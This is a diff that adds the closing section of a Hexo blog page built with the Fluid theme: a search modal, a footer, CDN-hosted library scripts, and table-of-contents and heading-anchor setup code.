+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
